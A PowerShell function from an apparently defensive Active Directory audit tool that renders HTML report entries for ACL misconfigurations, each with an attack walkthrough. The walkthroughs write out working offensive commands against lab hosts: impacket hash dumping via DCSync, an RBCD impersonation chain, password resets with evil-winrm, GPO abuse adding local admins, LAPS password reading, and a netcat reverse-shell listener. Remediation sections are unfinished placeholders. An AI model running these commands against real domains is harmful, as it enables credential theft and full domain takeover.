function Generate-ACLshtml {  
    param (
        [array]$ACLs
    )
    if (!$ACLs) {
        $html = @"
        <div class="finding-header">ACLs</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    }
    else {
        $html = @"
        <div class="finding-header">ACLs</div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header">Issue</th>
                    <th class="table-header">Risk</th>
                </tr>
            </thead>
            <tbody>
"@
        foreach ($finding in $ACLs) {
            if ($finding.Technique -eq "Low privileged principal has dangerous rights over the entire domain") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user has indirect control of the entire domain.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object Name</td><td>$($finding.ObjectName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>$($finding.AccessControlType)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Permissions in Active Directory can be delegated to specific users via a series of Access Control Entries (ACEs). It is common if there are access issues, for these to be modified and to grant users with "full" permissions over an object. Assigning specific ACE permissions to a user over the domain itself is particularly dangerous as without being a member of an auditable and controlled group such as domain admins, a principal may have equivalent rights yet be unknown to the management team.</p>
                                            <p>$($finding.Issue) This gives $($finding.IdentityReference) full control of the domain.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://redfoxsec.com/blog/abusing-acl-misconfigurations/">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/securing-active-directory-via-acls/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate rogue ACLs over the domain object for rights such as GenericAll, GenericWrite, WriteDacl or AllExtendedRights using bloodhound.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/entiredomain-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With the low-privileged user granted the rogue permsissions, the user has effective domain admin privileges. Therefore, it is as simple as performing a DCSync to extract all user password hashes within the domain.</p>
                                                    <p class="code">impacket-secretsdump test:'Password123!'@dc.test.local</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/entiredomain-2.png"
                                                        alt="Exploiting rogue ACLs">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            if ($finding.Technique -eq "Low privileged principal has DCSync rights") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user has indirect control of the entire domain.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object Name</td><td>$($finding.ObjectName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>$($finding.AccessControlType)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Permissions in Active Directory can be delegated to specific users via a series of Access Control Entries (ACEs). It is common if there are access issues, for these to be modified and to grant users with "full" permissions over an object. Assigning specific ACE permissions to a user over the domain itself is particularly dangerous as without being a member of an auditable and controlled group such as domain admins, a principal may have equivalent rights yet be unknown to the management team.</p>
                                            <p>$($finding.Issue) This gives $($finding.IdentityReference) ability to the behavior of a domain controller and obtain all the user password hashes within the domain via a DCSync.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://redfoxsec.com/blog/abusing-acl-misconfigurations/">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/securing-active-directory-via-acls/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate rogue ACLs over the domain object for rights such as AllExtendedRights (permission to DCSync) using bloodhound.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/dcsync-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With the low-privileged user granted the rogue DCSync permsissions, the user has ability to the behavior of a domain controller and obtain all the user password hashes within the domain via a DCSync, then use any prvivileged credential as they desire.</p>
                                                    <p class="code">impacket-secretsdump dcsyncer:'Password123!'@dc.test.local</p>            
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/dcsync-2.png"
                                                        alt="Exploiting rogue ACLs">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -eq "Low privileged principal has dangerous RBCD rights") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user can take full control of a server.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object Name</td><td>$($finding.ObjectName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>$($finding.AccessControlType)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Permissions in Active Directory can be delegated to specific users via a series of Access Control Entries (ACEs). It is common if there are access issues, for these to be modified and to grant users with "full" permissions over an server. With full control over a server, it is possible to exploit resource-based constrained delegation (RBCD) as the principal has permission to set the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property on the target server.</p>
                                            <p>$($finding.Issue) This gives $($finding.IdentityReference) the ability to take full control over the target server via RBCD.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://redfoxsec.com/blog/rbcd-resource-based-constrained-delegation-abuse/">Link 1</a></p>
                                            <p><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate rogue ACLs over target servers for rights such as GenericWrite / GenericAll using bloodhound.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/RBCD-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. To exploit resource-based constrained delegation an attacker must have control of an account with an SPN set in order to simulate the front-end service, for which the easiest way is to add a computer account if the machineaccountquota is not 0, as computer accounts have SPNs by default.</p>
                                                    <p class="code">impacket-addcomputer -computer-name 'attackerPC$' -computer-pass 'h4x' test.local/test:'Password123!'</p>     
                                                    <p>Then using the rights over the target server an adversary can update the msDS-AllowedToActOnBehalfOfOtherIdentity property on the target server (backend service) to configure resource-based constrained delegation from the attacker machine (frontend).</p>       
                                                    <p class="code">impacket-rbcd -delegate-from 'attackerPC$' -delegate-to 'DC$' -dc-ip 192.168.10.141 -action 'write' 'test.local'/'rbcduser':'Password123!'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/RBCD-2.png"
                                                        alt="Setting RBCD">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. With control of the frontend service (the added attacker computer), an adversary can request a ticket for any service on the backend they have full control over (DC$).</p>
                                                    <p class="code">impacket-getST -spn 'cifs/dc.test.local' -impersonate 'administrator' 'test.local/attackerPC$':'h4x' </p>     
                                                    <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service.</p>       
                                                    <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                                    <p class="code">impacket-wmiexec -k -no-pass administrator@dc.test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/RBCD-3.png"
                                                        alt="Exploiting RBCD">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -eq "Low privileged principal has dangerous rights") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user can take control of another principal and inherit their rights.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object Name</td><td>$($finding.ObjectName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>$($finding.AccessControlType)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Permissions in Active Directory can be delegated to specific users via a series of Access Control Entries (ACEs). It is common if there are access issues, for these to be modified and to grant users with "full" permissions over an object. With full privilege over an object, a user can take control of it by resetting the object's password, adding shadow credentials or through a targeted kerberoast attack.</p>
                                            <p>$($finding.Issue) This gives the principal full control over the target object.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://redfoxsec.com/blog/abusing-acl-misconfigurations/">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/securing-active-directory-via-acls/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate rogue ACLs using bloodhound. In this example account operators has full control over the "remotemanagement" user who has permission to connect to the domaincontroller via WinRM.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/dangerousright-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With full control of the remotemanagement account, the low-privileged user can simply reset the target account's password and impersonate the user and their privielges to remotely connect to the DC.</p>
                                                    <p class="code">net rpc password remotemanagement -U 'test.local/accountopertor%Password123!' -S test.local</p>    
                                                    <p class="code">evil-winrm -i dc.test.local -u remotemanagement -p newpassword</p>        
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/dangerousright-2.png"
                                                        alt="Exploiting rogue ACLs">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -eq "Low privileged principal has dangerous rights over GPOs") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user can take control of a Group Policy Object (GPO).</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Object Name</td><td>$($finding.ObjectName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>$($finding.AccessControlType)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>Permissions in Active Directory can be delegated to specific users via a series of Access Control Entries (ACEs). It is common if there are access issues, for these to be modified and to grant users with "full" permissions over an object. With full privilege over an object, a user can take control of it by resetting the object's password, adding shadow credentials or through a targeted kerberoast attack.</p>
                                            <p>$($finding.Issue) This gives the principal full control over the target object.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.synacktiv.com/en/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/securing-active-directory-via-acls/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate rogue ACLs over GPOs using bloodhound. In this example GPOACL has write permissions to the default domain policy which is incredibly dangerous.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/GPO-1.png"
                                                        alt="Finding rogue GPO ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With full control of the default domain GPO, an adversary can modify the group policy in a number of ways. One way would be to add an immediate scheduled task which will get executed as SYSTEM to add a target user to the local administrator groupn, giving full administrative control of servers in the domain.</p>
                                                    <p class="code">python3 pygpoabuse.py test.local/gpoacl:'Password123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators gpoacl /add' -f</p>    
                                                    <p>Once group policy has refreshed on all computers (takes 90 minutes by default), the user will be a local admin and can obtain a remote administrator command prompt on any system.</p>
                                                    <p class="code">nxc smb dc.test.local -u gpoacl -p 'Password123!'</p>   
                                                    <p class="code">impacket-wmiexec gpoacl:'Password123!'@dc.test.local</p>     
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/GPO-2.png"
                                                        alt="Exploiting rogue GPO ACLs">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL over GPO</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -eq "Low privileged principal can read LAPS password") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user can read the local administrator password on a computer.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">File</td><td>$($finding.File)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">AccessControlType</td><td>$($finding.AccessControlType)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>LAPS is a Microsoft solution for managing the credentials of a local administrator account on every machine, ensuring each machine has a unique local administrator password that is rotated on a regular schedule, to reduce the risk of lateral movement from password reuse. The permission ReadLAPSPassword grants users or groups the ability to read the ms-Mcs-AdmPwd property and as such get the cleartext local admin password from Active Directory. Permission to read the LAPS password should be delegated to server admins only, however in this case has been misconfigured to allow low-privilged users the ability to read the password.</p>
                                            <p>$($finding.issue) This means this user has administrative control of this device.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://www.sentinelone.com/blog/laps-vulnerability-assessment/">Link 1</a></p>
                                            <p><a href="https://adsecurity.org/?tag=laps">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Low privileged users that have rogue permissions to read LAPS passwords can be found with bloodhound.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Passwords/LAPS-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. An adversary can then simply read the plaintext LAPS password from the target computers ms-Mcs-AdmPwd property and escalate their privilege to local admins.</p>
                                                    <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M laps</p>     
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/Passwords/LAPS-2.png"
                                                        alt="Reading the LAPS password">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif ($finding.Technique -eq "Modifiable logon script") {
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $html += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-risk$($finding.Risk)">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged user can edit / replace a NETLOGON script with malicious code.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">File</td><td>$($finding.File)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>A logon script is a script that is executed under the context of a given user when that user logs into a computer in an Active Directory environment. These are stored in \\<domain>\NETLOGON folder on domain controllers and are typically used for things such as map file shares, add printers, update software or set background wallpapers with files from a central repository.</p>
                                            <p>Risks occur when these files have weak ACLs assigned, allowing modification from an unauthorised user. An adversary may replace the file with a malicious file and this will be executed by users unknowingly from the central location.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://offsec.blog/hidden-menace-how-to-identify-misconfigured-and-dangerous-logon-scripts/">Link 1</a></p>
                                            <p><a href="https://www.blackhillsinfosec.com/backdoors-breaches-logon-scripts/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. Any low-privileged user can browse through NETLOGON scripts and find those which have insecure permissions assigned allowing modification.</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/modifiablelogonscript-1.png"
                                                        alt="Finding rogue ACLs">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With full control to write to the logon script, an adversary can create a malicious file with the same name and upload it to replace the legitimate file with code that will establish a remote connection for the attacker.</p>
                                                    <p class="code">smbclient //dc.test.local/SYSVOL -U test%'Password123!'</p>     
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/ACLs/modifiablelogonscript-2.png"
                                                        alt="Replacing the logon script">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                            <div class="attack-text">
                                                <p>3. When the NETLOGON script is executed on a host (when a user logs on), the adversary will obtain a remote command shell on the target system.</p>
                                                <p class="code">nc -lvnp 443</p>   
                                            </div>
                                            <span class="image-cell">
                                                <img src="/Private/Report/Images/ACLs/modifiablelogonscript-3.png"
                                                    alt="Obtaining a reverse shell">
                                            </span>
                                        </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove rogue ACL on logon script</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
        }
        $html += "</tbody></table></div>"
    }
    return $html
}